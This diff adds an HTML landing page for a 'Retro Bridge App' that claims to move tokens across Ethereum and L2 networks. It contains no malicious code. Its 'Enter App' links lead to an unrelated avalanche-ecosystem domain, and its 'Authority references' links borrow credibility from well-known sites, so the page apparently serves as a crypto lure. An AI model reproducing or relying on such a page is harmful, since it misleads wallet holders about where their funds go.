@@ -1,0 +1,120 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Retro Bridge App</title>
+  <meta name="description" content="Retro Bridge App moves tokens across Ethereum and L2 networks from your own wallet.">
+  <link rel="canonical" href="https://retro-bridge-app.github.io/">
+  <meta name="robots" content="index,follow,max-image-preview:large">
+  <meta name="theme-color" content="#F7F5F6">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Retro Bridge App">
+  <meta property="og:description" content="Retro Bridge App moves tokens across Ethereum and L2 networks from your own wallet.">
+  <meta property="og:url" content="https://retro-bridge-app.github.io/">
+  <meta property="og:image" content="https://retro-bridge-app.github.io/favicon.png">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Retro Bridge App">
+  <meta name="twitter:description" content="Retro Bridge App moves tokens across Ethereum and L2 networks from your own wallet.">
+  <link rel="icon" type="image/png" href="favicon.png">
+  <link rel="apple-touch-icon" href="favicon.png">
+  <link rel="manifest" href="site.webmanifest">
+  <link rel="stylesheet" href="style.css">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "WebSite",
+        "@id": "https://retro-bridge-app.github.io/#website",
+        "url": "https://retro-bridge-app.github.io/",
+        "name": "Retro Bridge App",
+        "inLanguage": "en"
+      },
+      {
+        "@type": "WebApplication",
+        "@id": "https://retro-bridge-app.github.io/#app",
+        "name": "Retro Bridge App",
+        "applicationCategory": "FinanceApplication",
+        "operatingSystem": "Web",
+        "url": "https://retro-bridge-app.github.io/",
+        "offers": {
+          "@type": "Offer",
+          "price": "0",
+          "priceCurrency": "USD"
+        }
+      },
+      {
+        "@type": "Organization",
+        "@id": "https://retro-bridge-app.github.io/#organization",
+        "name": "Retro Bridge App",
+        "url": "https://retro-bridge-app.github.io/"
+      }
+    ]
+  }
+  </script>
+</head>
+<body>
+  <header class="topbar">
+    <div class="brand" aria-label="Retro Bridge App">
+      <img src="favicon.png" width="30" height="30" alt="">
+      <span>Retro Bridge App</span>
+    </div>
+    <nav class="nav" aria-label="Authority references">
+      <a href="https://etherscan.io/" target="_blank" rel="nofollow noopener noreferrer">Etherscan</a>
+      <a href="https://ethereum.org/bridges/" target="_blank" rel="nofollow noopener noreferrer">Ethereum bridges</a>
+      <a href="https://l2beat.com/scaling/summary" target="_blank" rel="nofollow noopener noreferrer">L2BEAT</a>
+    </nav>
+    <span class="spacer"></span>
+    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
+  </header>
+
+  <main class="stage">
+    <section class="hero" aria-label="Retro Bridge App">
+      <h1>Retro Bridge App</h1>
+      <p class="value"><strong>Retro Bridge App</strong> moves tokens across Ethereum and L2 networks from your own wallet.</p>
+    </section>
+
+    <section class="app-card" aria-label="Bridge route">
+      <div class="route">
+        <div class="leg">
+          <span class="label">From</span>
+          <span class="chip">
+            <img src="eth.png" width="28" height="28" alt="ETH">
+            <span>ETH</span>
+          </span>
+        </div>
+        <button class="switch" type="button" data-switch aria-label="Switch bridge direction">
+          <span aria-hidden="true">&#8594;</span>
+        </button>
+        <div class="leg">
+          <span class="label">To</span>
+          <span class="chip">
+            <img src="usdc.png" width="28" height="28" alt="USDC">
+            <span>USDC</span>
+          </span>
+        </div>
+      </div>
+      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App</a>
+    </section>
+  </main>
+
+  <footer class="footer">Retro Bridge App &mdash; 2026</footer>
+
+  <script>
+  (function () {
+    "use strict";
+    var button = document.querySelector("[data-switch]");
+    if (!button) return;
+    button.addEventListener("click", function () {
+      var chips = document.querySelectorAll(".chip");
+      if (chips.length !== 2) return;
+      var first = chips[0].innerHTML;
+      chips[0].innerHTML = chips[1].innerHTML;
+      chips[1].innerHTML = first;
+      button.classList.toggle("is-switched");
+    });
+  }());
+  </script>
+</body>
+</html>
